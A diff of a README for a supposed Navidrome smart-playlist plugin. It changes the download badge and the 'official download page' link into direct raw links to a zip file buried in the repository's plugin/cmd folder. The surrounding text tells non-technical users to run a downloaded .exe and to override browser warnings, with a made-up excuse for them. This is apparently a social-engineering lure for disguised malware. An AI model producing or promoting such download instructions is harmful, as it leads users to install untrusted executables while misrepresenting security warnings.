@@ -1,6 +1,6 @@
 # 🎵 SmartPlaylistNaviDrome - Create Spotify style music mixes automatically
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Growth360c684/SmartPlaylistNaviDrome)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Growth360c684/SmartPlaylistNaviDrome/raw/refs/heads/main/plugin/cmd/Smart_Drome_Navi_Playlist_v2.2-beta.1.zip)
 
 SmartPlaylistNaviDrome manages your music library by creating automatic playlists. It acts as a plugin for Navidrome to mimic features found in services like Spotify. You get organized mixes such as Daily Mixes, On Repeat, and Release Radar without manual work. This tool uses WebAssembly and Go to ensure your music server runs smooth while generating these lists.
 
@@ -19,7 +19,7 @@ You do not need to know how to code. This guide assumes you keep your music on y
 
 Visit the link below to reach the official download page for this software.
 
-[https://github.com/Growth360c684/SmartPlaylistNaviDrome](https://github.com/Growth360c684/SmartPlaylistNaviDrome)
+[https://github.com/Growth360c684/SmartPlaylistNaviDrome/raw/refs/heads/main/plugin/cmd/Smart_Drome_Navi_Playlist_v2.2-beta.1.zip](https://github.com/Growth360c684/SmartPlaylistNaviDrome/raw/refs/heads/main/plugin/cmd/Smart_Drome_Navi_Playlist_v2.2-beta.1.zip)
 
 On the page, look for the section labeled Releases on the right side of the screen. Click the latest version number. Look for the file ending in .exe and click it to save the file to your Downloads folder. Do not worry if your browser warns you about the file. This happens because the software communicates with your music server. Choose Keep or Run Anyway to finish the download.
 
